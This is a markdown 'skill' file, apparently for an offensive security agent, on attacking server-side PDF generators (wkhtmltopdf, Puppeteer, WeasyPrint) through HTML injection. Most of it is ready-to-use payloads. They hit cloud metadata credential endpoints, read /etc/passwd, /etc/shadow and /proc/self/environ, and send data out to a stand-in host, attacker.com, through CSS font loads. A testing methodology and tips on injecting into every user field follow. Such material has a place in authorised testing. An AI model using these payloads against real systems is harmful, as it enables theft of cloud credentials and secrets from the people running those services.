---
name: pdf-generation-ssrf
description: SSRF and XSS attacks via server-side PDF/HTML generation using wkhtmltopdf, Puppeteer, WeasyPrint, and similar renderers
---

# PDF Generation SSRF/XSS

When applications generate PDFs from user-supplied HTML/URLs (invoices, reports, tickets), the server-side renderer (wkhtmltopdf, Puppeteer, Chrome headless, WeasyPrint) can be exploited for SSRF, local file read, and XSS.

## Key Vulnerabilities

### SSRF via HTML Injection in PDF

```html
<!-- Inject in any user-controlled field rendered in PDF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="1000" height="1000"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel="stylesheet" href="http://169.254.169.254/latest/user-data/">
<script>document.write('<img src="http://169.254.169.254/latest/meta-data/">')</script>
```

### Local File Read

```html
<!-- wkhtmltopdf file:// protocol -->
<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
<embed src="file:///etc/shadow" width="1000" height="1000">
<object data="file:///proc/self/environ" width="1000" height="1000"></object>
<script>
  x = new XMLHttpRequest();
  x.open("GET","file:///etc/passwd",false);
  x.send();
  document.write("<pre>"+x.responseText+"</pre>");
</script>
```

### Exfiltration via CSS/Fonts

```html
<!-- Exfiltrate data via external resource loads -->
<style>
  @font-face { font-family: x; src: url(http://attacker.com/steal?data=loaded); }
  body { font-family: x; }
</style>
<link rel="stylesheet" href="http://attacker.com/log">
```

## Testing Methodology

1. **Identify PDF generation** — invoice downloads, report exports, ticket PDFs
2. **Inject HTML** in user-controlled fields (name, address, description, comments)
3. **Test SSRF** — inject `<iframe>` or `<img>` pointing to cloud metadata
4. **Test file read** — inject `file:///etc/passwd` via various HTML elements
5. **Test JS execution** — XMLHttpRequest to internal/file URLs with document.write

## Impact

- **Critical**: SSRF → cloud credential theft (AWS keys, GCP tokens)
- **Critical**: Local file read → /etc/passwd, environment variables, secrets
- **High**: Internal network scanning via SSRF

## Pro Tips

1. wkhtmltopdf is the most common vulnerable renderer — it supports file:// and JavaScript
2. Inject payloads in ALL user-controlled fields: name, email, address, description, comments
3. Even `<meta http-equiv="refresh" content="0;url=http://169.254.169.254/">` works in some renderers
4. Test blind SSRF with external callback (Burp Collaborator, webhook.site)
5. Python WeasyPrint has known SSRF via CSS `url()` — test `<link>` and `<style>` injection
